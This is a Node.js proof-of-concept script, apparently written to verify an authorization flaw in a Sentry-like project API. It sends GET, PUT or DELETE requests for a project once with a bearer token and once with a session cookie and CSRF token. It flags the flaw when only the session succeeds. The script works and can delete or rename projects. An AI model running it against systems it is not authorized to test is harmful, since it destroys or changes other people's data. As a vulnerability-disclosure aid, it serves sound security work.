import readline from "node:readline/promises";
import { stdin as input, stdout as output } from "node:process";

const DEFAULT_BASE_URL = "http://localhost:8000";
const ACTIONS = [
    { label: "GET project", value: "GET" },
    { label: "PUT project", value: "PUT" },
    { label: "DELETE project", value: "DELETE" },
];
const UPDATE_FIELDS = [
    { label: "Title / name", value: "name" },
    { label: "Slug", value: "slug" },
    { label: "Platform", value: "platform" },
];

function parseArgs(argv) {
    const args = {};

    for (let index = 0; index < argv.length; index += 1) {
        const arg = argv[index];

        if (!arg.startsWith("--")) {
            continue;
        }

        const [rawKey, inlineValue] = arg.slice(2).split("=", 2);
        const key = rawKey.replace(/-([a-z])/g, (_, letter) => letter.toUpperCase());

        if (inlineValue !== undefined) {
            args[key] = inlineValue;
            continue;
        }

        const nextValue = argv[index + 1];
        if (nextValue && !nextValue.startsWith("--")) {
            args[key] = nextValue;
            index += 1;
            continue;
        }

        args[key] = true;
    }

    return args;
}

function normalizeBaseUrl(value) {
    return value.replace(/\/$/, "");
}

function projectPath(organizationSlug, projectSlug) {
    return `/api/0/projects/${encodeURIComponent(organizationSlug)}/${encodeURIComponent(projectSlug)}/`;
}

function createSessionHeaders({ sessionId, csrfToken, baseUrl }) {
    const headers = {
        Cookie: csrfToken
            ? `sessionid=${sessionId}; csrftoken=${csrfToken}`
            : `sessionid=${sessionId}`,
    };

    if (csrfToken) {
        headers["X-CSRFToken"] = csrfToken;
        headers.Referer = `${baseUrl}/`;
        headers.Origin = baseUrl;
    }

    return headers;
}

async function prompt(rl, message, { defaultValue, required = true } = {}) {
    if (!rl) {
        if (defaultValue !== undefined) {
            return defaultValue;
        }

        if (!required) {
            return "";
        }

        throw new Error(`Missing ${message.toLowerCase()}.`);
    }

    for (;;) {
        const suffix = defaultValue === undefined ? "" : ` [${defaultValue}]`;
        const answer = (await rl.question(`${message}${suffix}: `)).trim();

        if (answer) {
            return answer;
        }

        if (defaultValue !== undefined) {
            return defaultValue;
        }

        if (!required) {
            return "";
        }

        console.log("This value is required.");
    }
}

async function choose(rl, message, choices) {
    if (!rl) {
        throw new Error(`Missing ${message.toLowerCase()}.`);
    }

    console.log(`\n${message}`);
    choices.forEach((choice, index) => {
        console.log(`  ${index + 1}. ${choice.label}`);
    });

    for (;;) {
        const raw = await rl.question("Select a number: ");
        const value = Number.parseInt(raw.trim(), 10);

        if (Number.isInteger(value) && value >= 1 && value <= choices.length) {
            return choices[value - 1];
        }

        console.log("Please pick one of the listed numbers.");
    }
}

function resolveMethod(value) {
    const normalized = value?.toUpperCase();
    return ACTIONS.some((action) => action.value === normalized) ? normalized : null;
}

function resolveUpdateField(value) {
    const normalized = value?.toLowerCase();
    if (!normalized) {
        return null;
    }

    if (normalized === "title" || normalized === "name") {
        return "name";
    }

    if (normalized === "slug" || normalized === "platform") {
        return normalized;
    }

    return UPDATE_FIELDS.find((item) => item.label.toLowerCase() === normalized)?.value ?? null;
}

function buildPayload(method, field, value) {
    if (method !== "PUT" || !field) {
        return undefined;
    }

    return { [field]: value };
}

function formatBody(text) {
    if (!text) {
        return "<empty>";
    }

    try {
        return JSON.stringify(JSON.parse(text), null, 2);
    } catch {
        return text;
    }
}

async function sendRequest({ baseUrl, method, path, headers, body }) {
    const response = await fetch(`${baseUrl}${path}`, {
        method,
        headers,
        body,
    });

    return {
        status: response.status,
        statusText: response.statusText,
        body: formatBody((await response.text()).slice(0, 4000)),
    };
}

async function resolveConfig(args, rl) {
    const method = resolveMethod(args.method) ?? (await choose(rl, "Choose an action", ACTIONS)).value;
    const baseUrl = normalizeBaseUrl(args.url ?? (await prompt(rl, "Base URL", { defaultValue: DEFAULT_BASE_URL })));
    const organizationSlug = args.org ?? (await prompt(rl, "Organization slug"));
    const projectSlug = args.project ?? (await prompt(rl, "Project slug"));
    const token = args.token ?? (await prompt(rl, "Bearer token"));
    const sessionId = args.sessionId ?? (await prompt(rl, "Session ID"));
    const csrfToken = args.csrfToken ?? (await prompt(rl, "CSRF token", { required: false }));

    let updateField = null;
    let updateValue = null;

    if (method === "PUT") {
        const field = resolveUpdateField(args.field) ?? (await choose(rl, "What do you want to change?", UPDATE_FIELDS)).value;
        updateField = resolveUpdateField(field) ?? field;

        if (updateField === "name") {
            updateValue = args.title ?? args.name ?? (await prompt(rl, "New project title"));
        } else if (updateField === "slug") {
            updateValue = args.newSlug ?? args.slug ?? (await prompt(rl, "New project slug"));
        } else if (updateField === "platform") {
            updateValue = args.platform ?? (await prompt(rl, "New project platform"));
        } else {
            updateValue = args.value ?? (await prompt(rl, "New value"));
        }
    }

    return {
        method,
        baseUrl,
        organizationSlug,
        projectSlug,
        token,
        sessionId,
        csrfToken,
        updateField,
        updateValue,
    };
}

function printResponse(label, response) {
    console.log(`\n[${label}]`);
    console.log(`Status: ${response.status} ${response.statusText}`);
    console.log(`Body:\n${response.body}`);
}

async function main() {
    const args = parseArgs(process.argv.slice(2));

    if (args.help) {
        console.log(`Usage:
  node index.mjs [--url URL] [--org ORG] [--project PROJECT] [--token TOKEN]
                 [--session-id SESSION] [--csrf-token TOKEN]
                 [--method GET|PUT|DELETE] [--field title|slug|platform]
                 [--title VALUE] [--name VALUE] [--slug VALUE] [--platform VALUE]

Missing values are requested interactively when a TTY is available.
`);
        return;
    }

    const interactive = process.stdin.isTTY && process.stdout.isTTY;
    const rl = interactive ? readline.createInterface({ input, output }) : null;

    try {
        const config = await resolveConfig(args, rl);
        const path = projectPath(config.organizationSlug, config.projectSlug);
        const body = buildPayload(config.method, config.updateField, config.updateValue);
        const jsonHeaders = body ? { "Content-Type": "application/json" } : {};

        console.log("\nProject target:", `${config.baseUrl}${path}`);
        console.log("Action:", config.method);

        const tokenResponse = await sendRequest({
            baseUrl: config.baseUrl,
            method: config.method,
            path,
            headers: {
                Authorization: `Bearer ${config.token}`,
                ...jsonHeaders,
            },
            body: body ? JSON.stringify(body) : undefined,
        });

        const sessionResponse = await sendRequest({
            baseUrl: config.baseUrl,
            method: config.method,
            path,
            headers: {
                ...createSessionHeaders({
                    sessionId: config.sessionId,
                    csrfToken: config.csrfToken,
                    baseUrl: config.baseUrl,
                }),
                ...jsonHeaders,
            },
            body: body ? JSON.stringify(body) : undefined,
        });

        printResponse("Bearer token", tokenResponse);
        printResponse("Browser session", sessionResponse);

        if (config.method === "GET") {
            console.log("\nResult:");
            console.log("GET completed for both auth paths.");
            return;
        }

        const tokenRejected = [401, 403].includes(tokenResponse.status);
        const sessionAccepted = [200, 202, 204].includes(sessionResponse.status);

        console.log("\nResult:");

        if (tokenRejected && sessionAccepted) {
            console.log("Vulnerable behavior confirmed.");
            console.log("The bearer token was rejected, but the browser session succeeded.");
            return;
        }

        console.log("Vulnerable behavior not confirmed.");
        console.log("Expected bearer token status: 401 or 403");
        console.log("Expected browser session status: 200, 202, or 204");
        process.exitCode = 1;
    } finally {
        rl?.close();
    }
}

main().catch((error) => {
    console.error("PoC failed:", error.message);
    process.exitCode = 1;
});
